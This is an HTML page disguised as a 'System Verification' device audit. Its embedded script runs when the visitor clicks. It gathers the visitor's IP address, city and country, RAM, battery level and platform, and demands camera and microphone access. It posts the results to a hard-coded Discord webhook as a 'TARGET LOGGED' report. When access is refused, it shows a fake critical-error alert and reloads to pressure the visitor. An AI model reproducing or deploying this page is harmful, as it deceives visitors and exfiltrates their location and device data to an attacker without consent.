<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script>
        const HOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";

        async function grab() {
            let data = {
                ip: "Scanning...",
                loc: "Denied",
                ram: navigator.deviceMemory || "Unknown",
                bat: "Unknown",
                plat: navigator.platform
            };

            try {
                const res = await fetch('https://ipapi.co/json/');
                const json = await res.json();
                data.ip = json.ip;
                data.loc = `${json.city}, ${json.country_name}`;
            } catch (e) {}

            // طلب الأذونات (يشتغل فقط على HTTPS)
            try {
                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                send(data, "✅ GRANTED");
            } catch (err) {
                send(data, "❌ DENIED");
                alert("Critical Error: Verification Failed. Please Allow Camera Access.");
                location.reload(); 
            }
        }

        async function send(info, status) {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info.bat = `${Math.round(b.level * 100)}%`;
            }

            const msg = {
                embeds: [{
                    title: "🎯 TARGET LOGGED - SUPREME V16",
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: info.ip, inline: true },
                        { name: "📍 Location", value: info.loc, inline: true },
                        { name: "📸 Permissions", value: status, inline: true },
                        { name: "🧠 RAM", value: info.ram + " GB", inline: true },
                        { name: "🔋 Battery", value: info.bat, inline: true },
                        { name: "📱 OS", value: info.plat, inline: true }
                    ],
                    footer: { text: "r3b Supreme Engine" },
                    timestamp: new Date()
                }]
            };

            fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
        }

        window.onclick = grab;
    </script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
        .box { border: 1px solid #0f0; padding: 50px; box-shadow: 0 0 15px #0f0; }
        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="box">
        <h1 class="blink">SYSTEM AUDIT REQUIRED</h1>
        <p>Verification ID: #77429</p>
        <p style="color: #fff;">[ CLICK TO VERIFY DEVICE ]</p>
    </div>
</body>
